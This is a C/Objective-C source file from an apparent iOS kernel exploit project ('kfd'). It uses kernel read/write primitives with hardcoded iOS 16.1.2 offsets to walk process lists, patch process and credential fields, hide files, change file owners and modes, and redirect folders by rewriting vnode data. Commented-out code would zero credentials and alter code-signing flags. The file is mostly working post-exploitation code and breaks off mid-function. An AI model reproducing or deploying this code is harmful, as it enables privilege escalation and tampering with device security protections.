//
//  fun.c
//  kfd
//
//  Created by Seo Hyun-gyu on 2023/07/25.
//

#include "fun.h"
#include "libkfd.h"
#include "helpers.h"
#include <sys/stat.h>
#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <sys/mount.h>
#include <sys/stat.h>
#include <sys/attr.h>
#include <sys/snapshot.h>

struct hfs_mount_args {
    char    *fspec;            /* block special device to mount */
    uid_t    hfs_uid;        /* uid that owns hfs files (standard HFS only) */
    gid_t    hfs_gid;        /* gid that owns hfs files (standard HFS only) */
    mode_t    hfs_mask;        /* mask to be applied for hfs perms  (standard HFS only) */
    u_int32_t hfs_encoding;    /* encoding for this volume (standard HFS only) */
    struct    timezone hfs_timezone;    /* user time zone info (standard HFS only) */
    int        flags;            /* mounting flags, see below */
    int     journal_tbuffer_size;   /* size in bytes of the journal transaction buffer */
    int        journal_flags;          /* flags to pass to journal_open/create */
    int        journal_disable;        /* don't use journaling (potentially dangerous) */
};

uint64_t do_kopen(uint64_t puaf_pages, uint64_t puaf_method, uint64_t kread_method, uint64_t kwrite_method)
{
    return kopen(puaf_pages, puaf_method, kread_method, kwrite_method);
}

void do_kclose(u64 kfd)
{
    kclose((struct kfd*)(kfd));
}


uint8_t kread8(u64 kfd, uint64_t where) {
    uint8_t out;
    kread(kfd, where, &out, sizeof(uint8_t));
    return out;
}
uint32_t kread16(u64 kfd, uint64_t where) {
    uint16_t out;
    kread(kfd, where, &out, sizeof(uint16_t));
    return out;
}
uint32_t kread32(u64 kfd, uint64_t where) {
    uint32_t out;
    kread(kfd, where, &out, sizeof(uint32_t));
    return out;
}
uint64_t kread64(u64 kfd, uint64_t where) {
    uint64_t out;
    kread(kfd, where, &out, sizeof(uint64_t));
    return out;
}

void kwrite8(u64 kfd, uint64_t where, uint8_t what) {
    uint8_t _buf[8] = {};
    _buf[0] = what;
    _buf[1] = kread8(kfd, where+1);
    _buf[2] = kread8(kfd, where+2);
    _buf[3] = kread8(kfd, where+3);
    _buf[4] = kread8(kfd, where+4);
    _buf[5] = kread8(kfd, where+5);
    _buf[6] = kread8(kfd, where+6);
    _buf[7] = kread8(kfd, where+7);
    kwrite((u64)(kfd), &_buf, where, sizeof(u64));
}

void kwrite16(u64 kfd, uint64_t where, uint16_t what) {
    u16 _buf[4] = {};
    _buf[0] = what;
    _buf[1] = kread16(kfd, where+2);
    _buf[2] = kread16(kfd, where+4);
    _buf[3] = kread16(kfd, where+6);
    kwrite((u64)(kfd), &_buf, where, sizeof(u64));
}

void kwrite32(u64 kfd, uint64_t where, uint32_t what) {
    u32 _buf[2] = {};
    _buf[0] = what;
    _buf[1] = kread32(kfd, where+4);
    kwrite((u64)(kfd), &_buf, where, sizeof(u64));
}
void kwrite64(u64 kfd, uint64_t where, uint64_t what) {
    u64 _buf[1] = {};
    _buf[0] = what;
    kwrite((u64)(kfd), &_buf, where, sizeof(u64));
}

uint64_t getProc(u64 kfd, pid_t pid) {
    uint64_t proc = ((struct kfd*)kfd)->info.kaddr.kernel_proc;
    
    while (true) {
        if(kread32(kfd, proc + 0x60/*PROC_P_PID_OFF*/) == pid) {
            return proc;
        }
        proc = kread64(kfd, proc + 0x8/*PROC_P_LIST_LE_PREV_OFF*/);
    }
    
    return 0;
}

uint64_t getProcByName(u64 kfd, char* nm) {
    uint64_t proc = ((struct kfd*)kfd)->info.kaddr.kernel_proc;
    
    while (true) {
        uint64_t nameptr = proc + 0x381;//PROC_P_NAME_OFF;
        char name[32];
        kread(kfd, nameptr, &name, 32);
//        printf("[i] pid: %d, process name: %s\n", kread32(kfd, proc + 0x60), name);
        if(strcmp(name, nm) == 0) {
            return proc;
        }
        proc = kread64(kfd, proc + 0x8);//PROC_P_LIST_LE_PREV_OFF);
    }
    
    return 0;
}

int getPidByName(u64 kfd, char* nm) {
    return kread32(kfd, getProcByName(kfd, nm) + 0x60);//PROC_P_PID_OFF);
}

int funProc(u64 kfd, uint64_t proc) {
    int p_ppid = kread32(kfd, proc + 0x20);
    printf("[i] self proc->p_ppid: %d\n", p_ppid);
    printf("[i] Patching proc->p_ppid %d -> 1 (for testing kwrite32)\n", p_ppid);
    kwrite32(kfd, proc + 0x20, 0x1);
    printf("getppid(): %u\n", getppid());
    kwrite32(kfd, proc + 0x20, p_ppid);

    int p_original_ppid = kread32(kfd, proc + 0x24);
    printf("[i] self proc->p_original_ppid: %d\n", p_original_ppid);
    
    int p_pgrpid = kread32(kfd, proc + 0x28);
    printf("[i] self proc->p_pgrpid: %d\n", p_pgrpid);
    
    int p_uid = kread32(kfd, proc + 0x2c);
    printf("[i] self proc->p_uid: %d\n", p_uid);
    
    int p_gid = kread32(kfd, proc + 0x30);
    printf("[i] self proc->p_gid: %d\n", p_gid);
    
    int p_ruid = kread32(kfd, proc + 0x34);
    printf("[i] self proc->p_ruid: %d\n", p_ruid);
    
    int p_rgid = kread32(kfd, proc + 0x38);
    printf("[i] self proc->p_rgid: %d\n", p_rgid);
    
    int p_svuid = kread32(kfd, proc + 0x3c);
    printf("[i] self proc->p_svuid: %d\n", p_svuid);
    
    int p_svgid = kread32(kfd, proc + 0x40);
    printf("[i] self proc->p_svgid: %d\n", p_svgid);
    
    int p_sessionid = kread32(kfd, proc + 0x44);
    printf("[i] self proc->p_sessionid: %d\n", p_sessionid);
    
    uint64_t p_puniqueid = kread64(kfd, proc + 0x48);
    printf("[i] self proc->p_puniqueid: 0x%llx\n", p_puniqueid);
    
    printf("[i] Patching proc->p_puniqueid 0x%llx -> 0x4142434445464748 (for testing kwrite64)\n", p_puniqueid);
    kwrite64(kfd, proc+0x48, 0x4142434445464748);
    printf("[i] self proc->p_puniqueid: 0x%llx\n", kread64(kfd, proc + 0x48));
    kwrite64(kfd, proc+0x48, p_puniqueid);
    
    return 0;
}

int funUcred(u64 kfd, uint64_t proc) {
    uint64_t proc_ro = kread64(kfd, proc + 0x18);
    uint64_t ucreds = kread64(kfd, proc_ro + 0x20);
    
    uint64_t cr_label_pac = kread64(kfd, ucreds + 0x78);
    uint64_t cr_label = cr_label_pac | 0xffffff8000000000;
    printf("[i] self ucred->cr_label: 0x%llx\n", cr_label);
//
//    printf("[i] self ucred->cr_label+0x8+0x0: 0x%llx\n", kread64(kfd, kread64(kfd, cr_label+0x8)));
//    printf("[i] self ucred->cr_label+0x8+0x0+0x0: 0x%llx\n", kread64(kfd, kread64(kfd, kread64(kfd, cr_label+0x8))));
//    printf("[i] self ucred->cr_label+0x10: 0x%llx\n", kread64(kfd, cr_label+0x10));
//    uint64_t OSEntitlements = kread64(kfd, cr_label+0x10);
//    printf("OSEntitlements: 0x%llx\n", OSEntitlements);
//    uint64_t CEQueryContext = OSEntitlements + 0x28;
//    uint64_t der_start = kread64(kfd, CEQueryContext + 0x20);
//    uint64_t der_end = kread64(kfd, CEQueryContext + 0x28);
//    for(int i = 0; i < 100; i++) {
//        printf("OSEntitlements+0x%x: 0x%llx\n", i*8, kread64(kfd, OSEntitlements + i * 8));
//    }
//    kwrite64(kfd, kread64(kfd, OSEntitlements), 0);
//    kwrite64(kfd, kread64(kfd, OSEntitlements + 8), 0);
//    kwrite64(kfd, kread64(kfd, OSEntitlements + 0x10), 0);
//    kwrite64(kfd, kread64(kfd, OSEntitlements + 0x20), 0);
    
    uint64_t cr_posix_p = ucreds + 0x18;
    printf("[i] self ucred->posix_cred->cr_uid: %u\n", kread32(kfd, cr_posix_p + 0));
    printf("[i] self ucred->posix_cred->cr_ruid: %u\n", kread32(kfd, cr_posix_p + 4));
    printf("[i] self ucred->posix_cred->cr_svuid: %u\n", kread32(kfd, cr_posix_p + 8));
    printf("[i] self ucred->posix_cred->cr_ngroups: %u\n", kread32(kfd, cr_posix_p + 0xc));
    printf("[i] self ucred->posix_cred->cr_groups: %u\n", kread32(kfd, cr_posix_p + 0x10));
    printf("[i] self ucred->posix_cred->cr_rgid: %u\n", kread32(kfd, cr_posix_p + 0x50));
    printf("[i] self ucred->posix_cred->cr_svgid: %u\n", kread32(kfd, cr_posix_p + 0x54));
    printf("[i] self ucred->posix_cred->cr_gmuid: %u\n", kread32(kfd, cr_posix_p + 0x58));
    printf("[i] self ucred->posix_cred->cr_flags: %u\n", kread32(kfd, cr_posix_p + 0x5c));
    
//    sleep(3);
//    kwrite32(kfd, cr_posix_p+0, 501);
//    printf("[i] self ucred->posix_cred->cr_uid: %u\n", kread32(kfd, cr_posix_p + 0));
    
//    kwrite64(kfd, cr_posix_p+0, 0);
//    kwrite64(kfd, cr_posix_p+8, 0);
//    kwrite64(kfd, cr_posix_p+16, 0);
//    kwrite64(kfd, cr_posix_p+24, 0);
//    kwrite64(kfd, cr_posix_p+32, 0);
//    kwrite64(kfd, cr_posix_p+40, 0);
//    kwrite64(kfd, cr_posix_p+48, 0);
//    kwrite64(kfd, cr_posix_p+56, 0);
//    kwrite64(kfd, cr_posix_p+64, 0);
//    kwrite64(kfd, cr_posix_p+72, 0);
//    kwrite64(kfd, cr_posix_p+80, 0);
//    kwrite64(kfd, cr_posix_p+88, 0);
    
//    setgroups(0, 0);
    return 0;
}

uint64_t funVnodeHide(u64 kfd, char* filename) {
    //16.1.2 offsets
    uint32_t off_p_pfd = 0xf8;
    uint32_t off_fd_ofiles = 0;
    uint32_t off_fp_fglob = 0x10;
    uint32_t off_fg_data = 0x38;
    uint32_t off_vnode_iocount = 0x64;
    uint32_t off_vnode_usecount = 0x60;
    uint32_t off_vnode_vflags = 0x54;
    
    int file_index = open(filename, O_RDONLY);
    if (file_index == -1) return -1;
    
    uint64_t proc = getProc(kfd, getpid());
    
    //get vnode
    uint64_t filedesc_pac = kread64(kfd, proc + off_p_pfd);
    uint64_t filedesc = filedesc_pac | 0xffffff8000000000;
    uint64_t openedfile = kread64(kfd, filedesc + (8 * file_index));
    uint64_t fileglob_pac = kread64(kfd, openedfile + off_fp_fglob);
    uint64_t fileglob = fileglob_pac | 0xffffff8000000000;
    uint64_t vnode_pac = kread64(kfd, fileglob + off_fg_data);
    uint64_t vnode = vnode_pac | 0xffffff8000000000;
    printf("[i] vnode: 0x%llx\n", vnode);
    
    //vnode_ref, vnode_get
    uint32_t usecount = kread32(kfd, vnode + off_vnode_usecount);
    uint32_t iocount = kread32(kfd, vnode + off_vnode_iocount);
    printf("[i] vnode->usecount: %d, vnode->iocount: %d\n", usecount, iocount);
    kwrite32(kfd, vnode + off_vnode_usecount, usecount + 1);
    kwrite32(kfd, vnode + off_vnode_iocount, iocount + 1);
    
#define VISSHADOW 0x008000
    //hide file
    uint32_t v_flags = kread32(kfd, vnode + off_vnode_vflags);
    printf("[i] vnode->v_flags: 0x%x\n", v_flags);
    kwrite32(kfd, vnode + off_vnode_vflags, (v_flags | VISSHADOW));

    //exist test (should not be exist
    printf("[i] %s access ret: %d\n", filename, access(filename, F_OK));
    
    //show file
    v_flags = kread32(kfd, vnode + off_vnode_vflags);
    kwrite32(kfd, vnode + off_vnode_vflags, (v_flags &= ~VISSHADOW));
    
    printf("[i] %s access ret: %d\n", filename, access(filename, F_OK));
    
    close(file_index);
    
    //restore vnode iocount, usecount
    usecount = kread32(kfd, vnode + off_vnode_usecount);
    iocount = kread32(kfd, vnode + off_vnode_iocount);
    if(usecount > 0)
        kwrite32(kfd, vnode + off_vnode_usecount, usecount - 1);
    if(iocount > 0)
        kwrite32(kfd, vnode + off_vnode_iocount, iocount - 1);

    return 0;
}

uint64_t funVnodeChown(u64 kfd, char* filename, uid_t uid, gid_t gid) {
    uint32_t off_p_pfd = 0xf8;
    uint32_t off_vnode_v_data = 0xe0;
    uint32_t off_fp_fglob = 0x10;
    uint32_t off_fg_data = 0x38;
    
    int file_index = open(filename, O_RDONLY);
    if (file_index == -1) return -1;
    
    uint64_t proc = getProc(kfd, getpid());
    
    //get vnode
    uint64_t filedesc_pac = kread64(kfd, proc + off_p_pfd);
    uint64_t filedesc = filedesc_pac | 0xffffff8000000000;
    uint64_t openedfile = kread64(kfd, filedesc + (8 * file_index));
    uint64_t fileglob_pac = kread64(kfd, openedfile + off_fp_fglob);
    uint64_t fileglob = fileglob_pac | 0xffffff8000000000;
    uint64_t vnode_pac = kread64(kfd, fileglob + off_fg_data);
    uint64_t vnode = vnode_pac | 0xffffff8000000000;
    uint64_t v_data = kread64(kfd, vnode + off_vnode_v_data);
    uint32_t v_uid = kread32(kfd, v_data + 0x80);
    uint32_t v_gid = kread32(kfd, v_data + 0x84);
    
    //vnode->v_data->uid
    printf("[i] Patching %s vnode->v_uid %d -> %d\n", filename, v_uid, uid);
    kwrite32(kfd, v_data+0x80, uid);
    //vnode->v_data->gid
    printf("[i] Patching %s vnode->v_gid %d -> %d\n", filename, v_gid, gid);
    kwrite32(kfd, v_data+0x84, gid);
    
    close(file_index);
    
    struct stat file_stat;
    if(stat(filename, &file_stat) == 0) {
        printf("[i] %s UID: %d\n", filename, file_stat.st_uid);
        printf("[i] %s GID: %d\n", filename, file_stat.st_gid);
    }
    
    return 0;
}

uint64_t funVnodeChmod(u64 kfd, char* filename, mode_t mode) {
    uint32_t off_p_pfd = 0xf8;
    uint32_t off_vnode_v_data = 0xe0;
    uint32_t off_fp_fglob = 0x10;
    uint32_t off_fg_data = 0x38;
    
    int file_index = open(filename, O_RDONLY);
    if (file_index == -1) return -1;
    
    uint64_t proc = getProc(kfd, getpid());

    uint64_t filedesc_pac = kread64(kfd, proc + off_p_pfd);
    uint64_t filedesc = filedesc_pac | 0xffffff8000000000;
    uint64_t openedfile = kread64(kfd, filedesc + (8 * file_index));
    uint64_t fileglob_pac = kread64(kfd, openedfile + off_fp_fglob);
    uint64_t fileglob = fileglob_pac | 0xffffff8000000000;
    uint64_t vnode_pac = kread64(kfd, fileglob + off_fg_data);
    uint64_t vnode = vnode_pac | 0xffffff8000000000;
    uint64_t v_data = kread64(kfd, vnode + off_vnode_v_data);
    uint32_t v_mode = kread32(kfd, v_data + 0x88);
    
    close(file_index);
    
    printf("[i] Patching %s vnode->v_mode %o -> %o\n", filename, v_mode, mode);
    kwrite32(kfd, v_data+0x88, mode);
    
    struct stat file_stat;
    if(stat(filename, &file_stat) == 0) {
        printf("[i] %s mode: %o\n", filename, file_stat.st_mode);
    }
    
    return 0;
}

int funCSFlags(u64 kfd, char* process) {
    uint64_t pid = getPidByName(kfd, process);
    uint64_t proc = getProc(kfd, pid);
    
    uint64_t proc_ro = kread64(kfd, proc + 0x18);
    uint32_t csflags = kread32(kfd, proc_ro + 0x1C);
    printf("[i] %s proc->proc_ro->csflags: 0x%x\n", process, csflags);
    
#define TF_PLATFORM 0x400

#define CS_GET_TASK_ALLOW    0x0000004    /* has get-task-allow entitlement */
#define CS_INSTALLER        0x0000008    /* has installer entitlement */

#define    CS_HARD            0x0000100    /* don't load invalid pages */
#define    CS_KILL            0x0000200    /* kill process if it becomes invalid */
#define CS_RESTRICT        0x0000800    /* tell dyld to treat restricted */

#define CS_PLATFORM_BINARY    0x4000000    /* this is a platform binary */

#define CS_DEBUGGED         0x10000000  /* process is currently or has previously been debugged and allowed to run with invalid pages */
    
//    csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW | CS_DEBUGGED) & ~(CS_RESTRICT | CS_HARD | CS_KILL);
//    sleep(3);
//    kwrite32(kfd, proc_ro + 0x1c, csflags);
    
    return 0;
}

int funTask(u64 kfd, char* process) {
    uint64_t pid = getPidByName(kfd, process);
    uint64_t proc = getProc(kfd, pid);
    printf("[i] %s proc: 0x%llx\n", process, proc);
    uint64_t proc_ro = kread64(kfd, proc + 0x18);
    
    uint64_t pr_proc = kread64(kfd, proc_ro + 0x0);
    printf("[i] %s proc->proc_ro->pr_proc: 0x%llx\n", process, pr_proc);
    
    uint64_t pr_task = kread64(kfd, proc_ro + 0x8);
    printf("[i] %s proc->proc_ro->pr_task: 0x%llx\n", process, pr_task);
    
    //proc_is64bit_data+0x18: LDR             W8, [X8,#0x3D0]
    uint32_t t_flags = kread32(kfd, pr_task + 0x3D0);
    printf("[i] %s task->t_flags: 0x%x\n", process, t_flags);
    
    
    /*
     * RO-protected flags:
     */
    #define TFRO_PLATFORM                   0x00000400                      /* task is a platform binary */
    #define TFRO_FILTER_MSG                 0x00004000                      /* task calls into message filter callback before sending a message */
    #define TFRO_PAC_EXC_FATAL              0x00010000                      /* task is marked a corpse if a PAC exception occurs */
    #define TFRO_PAC_ENFORCE_USER_STATE     0x01000000                      /* Enforce user and kernel signed thread state */
    uint32_t t_flags_ro = kread64(kfd, proc_ro + 0x78);
    printf("[i] %s proc->proc_ro->t_flags_ro: 0x%x\n", process, t_flags_ro);
    
    return 0;
}

uint64_t findRootVnode(u64 kfd) {
    uint32_t off_p_textvp = 0x350;
    uint32_t off_vnode_v_name = 0xb8;
    uint32_t off_vnode_v_parent = 0xc0;
    uint32_t off_vnode_v_mount = 0xd8;
    uint32_t off_mount_mnt_devvp = 0x980;
    
    uint64_t launchd_proc = getProc(kfd, 1);
    
    uint64_t textvp_pac = kread64(kfd, launchd_proc + off_p_textvp);
    uint64_t textvp = textvp_pac | 0xffffff8000000000;
    printf("[i] launchd proc->textvp: 0x%llx\n", textvp);

    uint64_t textvp_nameptr = kread64(kfd, textvp + off_vnode_v_name);
    uint64_t textvp_name = kread64(kfd, textvp_nameptr);
    uint64_t devvp = kread64(kfd, (kread64(kfd, textvp + off_vnode_v_mount) | 0xffffff8000000000) + off_mount_mnt_devvp);
    uint64_t nameptr = kread64(kfd, devvp + off_vnode_v_name);
    uint64_t name = kread64(kfd, nameptr);
    char* devName = &name;
    printf("[i] launchd proc->textvp->v_name: %s, v_mount->mnt_devvp->v_name: %s\n", &textvp_name, devName);
    
    uint64_t sbin_vnode = kread64(kfd, textvp + off_vnode_v_parent) | 0xffffff8000000000;
    textvp_nameptr = kread64(kfd, sbin_vnode + off_vnode_v_name);
    textvp_name = kread64(kfd, textvp_nameptr);
    devvp = kread64(kfd, (kread64(kfd, textvp + off_vnode_v_mount) | 0xffffff8000000000) + off_mount_mnt_devvp);
    nameptr = kread64(kfd, devvp + off_vnode_v_name);
    name = kread64(kfd, nameptr);
    devName = &name;
    printf("[i] launchd proc->textvp->v_parent->v_name: %s, v_mount->mnt_devvp->v_name:%s\n", &textvp_name, devName);
    
    uint64_t root_vnode = kread64(kfd, sbin_vnode + off_vnode_v_parent) | 0xffffff8000000000;
    textvp_nameptr = kread64(kfd, root_vnode + off_vnode_v_name);
    textvp_name = kread64(kfd, textvp_nameptr);
    devvp = kread64(kfd, (kread64(kfd, root_vnode + off_vnode_v_mount) | 0xffffff8000000000) + off_mount_mnt_devvp);
    nameptr = kread64(kfd, devvp + off_vnode_v_name);
    name = kread64(kfd, nameptr);
    devName = &name;
    printf("[i] launchd proc->textvp->v_parent->v_parent->v_name: %s, v_mount->mnt_devvp->v_name:%s\n", &textvp_name, devName);
    printf("[+] rootvnode: 0x%llx\n", root_vnode);
    
    return root_vnode;
}

uint64_t funVnodeRedirectFolder(u64 kfd, char* to, char* from) {
    //16.1.2 offsets
    uint32_t off_p_pfd = 0xf8;
    uint32_t off_fp_fglob = 0x10;
    uint32_t off_fg_data = 0x38;
    uint32_t off_vnode_usecount = 0x60;
    uint32_t off_vnode_v_data = 0xe0;
    uint32_t off_vnode_v_kusecount = 0x5c;
    uint32_t off_vnode_v_references = 0x5b;
    uint32_t off_vnode_v_name = 0xb8;
    
    int file_index = open(to, O_RDONLY);
    if (file_index == -1) return -1;
    
    uint64_t proc = getProc(kfd, getpid());
    
    //get vnode
    uint64_t filedesc_pac = kread64(kfd, proc + off_p_pfd);
    uint64_t filedesc = filedesc_pac | 0xffffff8000000000;
    uint64_t openedfile = kread64(kfd, filedesc + (8 * file_index));
    uint64_t fileglob_pac = kread64(kfd, openedfile + off_fp_fglob);
    uint64_t fileglob = fileglob_pac | 0xffffff8000000000;
    uint64_t vnode_pac = kread64(kfd, fileglob + off_fg_data);
    uint64_t to_vnode = vnode_pac | 0xffffff8000000000;
    
    uint8_t to_v_references = kread8(kfd, to_vnode + off_vnode_v_references);
    uint32_t to_usecount = kread32(kfd, to_vnode + off_vnode_usecount);
    uint32_t to_v_kusecount = kread32(kfd, to_vnode + off_vnode_v_kusecount);
    
    close(file_index);
    
    file_index = open(from, O_RDONLY);
    if (file_index == -1) return -1;
    
    filedesc_pac = kread64(kfd, proc + off_p_pfd);
    filedesc = filedesc_pac | 0xffffff8000000000;
    openedfile = kread64(kfd, filedesc + (8 * file_index));
    fileglob_pac = kread64(kfd, openedfile + off_fp_fglob);
    fileglob = fileglob_pac | 0xffffff8000000000;
    vnode_pac = kread64(kfd, fileglob + off_fg_data);
    uint64_t from_vnode = vnode_pac | 0xffffff8000000000;
    
    uint64_t from_v_data = kread64(kfd, from_vnode+ off_vnode_v_data);
    
    close(file_index);
    
    kwrite32(kfd, to_vnode + off_vnode_usecount, to_usecount + 1);
    kwrite32(kfd, to_vnode + off_vnode_v_kusecount, to_v_kusecount + 1);
    kwrite8(kfd, to_vnode + off_vnode_v_references, to_v_references + 1);
    kwrite64(kfd, to_vnode + off_vnode_v_data, from_v_data);
    
    return 0;
}

void do_respring()
{
    respringFrontboard();
}

void do_bbrespring()
{
    xpc_crasher("com.apple.mobilegestalt.xpc");
    xpc_crasher("com.apple.backboard.TouchDeliveryPolicyServer");
    respringBackboard();
}

uint64_t funVnodeResearch(u64 kfd, char* to, char* from) {
    //16.1.2 offsets
    uint32_t off_p_pfd = 0xf8;
    uint32_t off_fd_ofiles = 0;
    uint32_t off_fp_fglob = 0x10;
    uint32_t off_fg_data = 0x38;
    uint32_t off_vnode_iocount = 0x64;
    uint32_t off_vnode_usecount = 0x60;
    uint32_t off_vnode_vflags = 0x54;
    uint32_t off_vnode_v_name = 0xb8;
    uint32_t off_vnode_v_mount = 0xd8;
    uint32_t off_vnode_v_data = 0xe0;
    uint32_t off_vnode_v_kusecount = 0x5c;
    uint32_t off_vnode_v_references = 0x5b;
    uint32_t off_vnode_v_parent = 0xc0;
    uint32_t off_vnode_v_label = 0xe8;
    uint32_t off_vnode_v_cred = 0x98;
    uint32_t off_vnode_vu_mountedhere = 0x68;
    uint32_t off_vnode_vu_socket = 0x70;
    uint32_t off_vnode_vu_specinfo = 0x78;
    uint32_t off_vnode_vu_fifoinfo = 0x80;
    uint32_t off_vnode_vu_ubcinfo = 0x88;
    uint32_t off_mount_mnt_data = 0x11F;
    uint32_t off_mount_mnt_fsowner = 0x9c0;
    uint32_t off_mount_mnt_fsgroup = 0x9c4;
    uint32_t off_mount_mnt_devvp = 0x980;
    uint32_t off_specinfo_si_flags = 0x10;
    
    int file_index = open(to, O_RDONLY);
    if (file_index == -1) return -1;
    
    uint64_t proc = getProc(kfd, getpid());
    
    //get vnode
    uint64_t filedesc_pac = kread64(kfd, proc + off_p_pfd);
    uint64_t filedesc = filedesc_pac | 0xffffff8000000000;
    uint64_t openedfile = kread64(kfd, filedesc + (8 * file_index));
    uint64_t fileglob_pac = kread64(kfd, openedfile + off_fp_fglob);
    uint64_t fileglob = fileglob_pac | 0xffffff8000000000;
    uint64_t vnode_pac = kread64(kfd, fileglob + off_fg_data);
    uint64_t to_vnode = vnode_pac | 0xffffff8000000000;
    printf("[i] %s to_vnode: 0x%llx\n", to, to_vnode);
    
    uint64_t to_v_mount_pac = kread64(kfd, to_vnode + off_vnode_v_mount);
    uint64_t to_v_mount = to_v_mount_pac | 0xffffff8000000000;
    printf("[i] %s to_vnode->v_mount: 0x%llx\n", to, to_v_mount);
    uint64_t to_v_data = kread64(kfd, to_vnode + off_vnode_v_data);
    printf("[i] %s to_vnode->v_data: 0x%llx\n", from, to_v_data);
    uint64_t to_v_label = kread64(kfd, to_vnode + off_vnode_v_label);
    printf("[i] %s to_vnode->v_label: 0x%llx\n", to, to_v_label);
    
    uint8_t to_v_references = kread8(kfd, to_vnode + off_vnode_v_references);
    printf("[i] %s to_vnode->v_references: %d\n", to, to_v_references);
    uint32_t to_usecount = kread32(kfd, to_vnode + off_vnode_usecount);
    printf("[i] %s to_vnode->usecount: %d\n", to, to_usecount);
    uint32_t to_iocount = kread32(kfd, to_vnode + off_vnode_iocount);
    printf("[i] %s to_vnode->iocount: %d\n", to, to_iocount);
    uint32_t to_v_kusecount = kread32(kfd, to_vnode + off_vnode_v_kusecount);
    printf("[i] %s to_vnode->kusecount: %d\n", to, to_v_kusecount);
    uint64_t to_v_parent_pac = kread64(kfd, to_vnode + off_vnode_v_parent);
    uint64_t to_v_parent = to_v_parent_pac | 0xffffff8000000000;
    printf("[i] %s to_vnode->v_parent: 0x%llx\n", to, to_v_parent);
    uint64_t to_v_freelist_tqe_next = kread64(kfd, to_vnode + 0x10); //v_freelist.tqe_next
    printf("[i] %s to_vnode->v_freelist.tqe_next: 0x%llx\n", to, to_v_freelist_tqe_next);
    uint64_t to_v_freelist_tqe_prev = kread64(kfd, to_vnode + 0x18); //v_freelist.tqe_prev
    printf("[i] %s to_vnode->v_freelist.tqe_prev: 0x%llx\n", to, to_v_freelist_tqe_prev);
    uint64_t to_v_mntvnodes_tqe_next = kread64(kfd, to_vnode + 0x20);   //v_mntvnodes.tqe_next
    printf("[i] %s to_vnode->v_mntvnodes.tqe_next: 0x%llx\n", to, to_v_mntvnodes_tqe_next);
    uint64_t to_v_mntvnodes_tqe_prev = kread64(kfd, to_vnode + 0x28);  //v_mntvnodes.tqe_prev
    printf("[i] %s to_vnode->v_mntvnodes.tqe_prev: 0x%llx\n", to, to_v_mntvnodes_tqe_prev);
    uint64_t to_v_ncchildren_tqh_first = kread64(kfd, to_vnode + 0x30);
    printf("[i] %s to_vnode->v_ncchildren.tqh_first: 0x%llx\n", to, to_v_ncchildren_tqh_first);
    uint64_t to_v_ncchildren_tqh_last = kread64(kfd, to_vnode + 0x38);
    printf("[i] %s to_vnode->v_ncchildren.tqh_last: 0x%llx\n", to, to_v_ncchildren_tqh_last);
    uint64_t to_v_nclinks_lh_first = kread64(kfd, to_vnode + 0x40);
    printf("[i] %s to_vnode->v_nclinks.lh_first: 0x%llx\n", to, to_v_nclinks_lh_first);
    uint64_t to_v_defer_reclaimlist = kread64(kfd, to_vnode + 0x48);    //v_defer_reclaimlist
    printf("[i] %s to_vnode->v_defer_reclaimlist: 0x%llx\n", to, to_v_defer_reclaimlist);
    uint32_t to_v_listflag = kread32(kfd, to_vnode + 0x50);    //v_listflag
    printf("[i] %s to_vnode->v_listflag: 0x%x\n", to, to_v_listflag);
    uint64_t to_v_cred_pac = kread64(kfd, to_vnode + off_vnode_v_cred);
    uint64_t to_v_cred = to_v_cred_pac | 0xffffff8000000000;
    printf("[i] %s to_vnode->v_cred: 0x%llx\n", to, to_v_cred);
    
    uint64_t to_devvp = kread64(kfd, to_v_mount + off_mount_mnt_devvp);
    printf("[i] %s to_vnode->v_mount->mnt_devvp: 0x%llx\n", to, to_devvp);
    uint64_t to_devvp_nameptr = kread64(kfd, to_devvp + off_vnode_v_name);
    uint64_t to_devvp_name = kread64(kfd, to_devvp_nameptr);
    printf("[i] %s to_vnode->v_mount->mnt_devvp->v_name: %s\n", to, &to_devvp_name);
    uint64_t to_devvp_vu_specinfo_pac = kread64(kfd, to_devvp + off_vnode_vu_specinfo);
    uint64_t to_devvp_vu_specinfo = to_devvp_vu_specinfo_pac | 0xffffff8000000000;
    printf("[i] %s to_devvp->vu_specinfo: 0x%llx\n", to, to_devvp_vu_specinfo);
    uint32_t to_devvp_vu_specinfo_si_flags = kread32(kfd, to_devvp_vu_specinfo + off_specinfo_si_flags);
    printf("[i] %s to_devvp->vu_specinfo->si_flags: 0x%x\n", to, to_devvp_vu_specinfo_si_flags);
    
    close(file_index);
    
    file_index = open(from, O_RDONLY);
    if (file_index == -1) return -1;
    
    //get vnode
    filedesc_pac = kread64(kfd, proc + off_p_pfd);
    filedesc = filedesc_pac | 0xffffff8000000000;
    openedfile = kread64(kfd, filedesc + (8 * file_index));
    fileglob_pac = kread64(kfd, openedfile + off_fp_fglob);
    fileglob = fileglob_pac | 0xffffff8000000000;
    vnode_pac = kread64(kfd, fileglob + off_fg_data);
    uint64_t from_vnode = vnode_pac | 0xffffff8000000000;
    printf("[i] %s from_vnode: 0x%llx\n", from, from_vnode);
    
    close(file_index);
    
    uint64_t from_v_mount_pac = kread64(kfd, from_vnode + off_vnode_v_mount);
    uint64_t from_v_mount = from_v_mount_pac | 0xffffff8000000000;
    printf("[i] %s from_vnode->v_mount: 0x%llx\n", from, from_v_mount);
    uint64_t from_v_data = kread64(kfd, from_vnode + off_vnode_v_data);
    printf("[i] %s from_vnode->v_data: 0x%llx\n", from, from_v_data);
    uint64_t from_v_label = kread64(kfd, from_vnode + off_vnode_v_label);
    printf("[i] %s from_vnode->v_label: 0x%llx\n", from, from_v_label);
    uint8_t from_v_references = kread8(kfd, from_vnode + off_vnode_v_references);
    printf("[i] %s from_vnode->v_references: %d\n", from, from_v_references);
    uint32_t from_usecount = kread32(kfd, from_vnode + off_vnode_usecount);
    printf("[i] %s from_vnode->usecount: %d\n", from, from_usecount);
    uint32_t from_iocount = kread32(kfd, from_vnode + off_vnode_iocount);
    printf("[i] %s from_vnode->iocount: %d\n", from, from_iocount);
    uint32_t from_v_kusecount = kread32(kfd, from_vnode + off_vnode_v_kusecount);
    printf("[i] %s from_vnode->kusecount: %d\n", from, from_v_kusecount);
    uint64_t from_v_parent_pac = kread64(kfd, from_vnode + off_vnode_v_parent);
    uint64_t from_v_parent = from_v_parent_pac | 0xffffff8000000000;
    printf("[i] %s from_vnode->v_parent: 0x%llx\n", from, from_v_parent);
    uint64_t from_v_freelist_tqe_next = kread64(kfd, from_vnode + 0x10); //v_freelist.tqe_next
    printf("[i] %s from_vnode->v_freelist.tqe_next: 0x%llx\n", from, from_v_freelist_tqe_next);
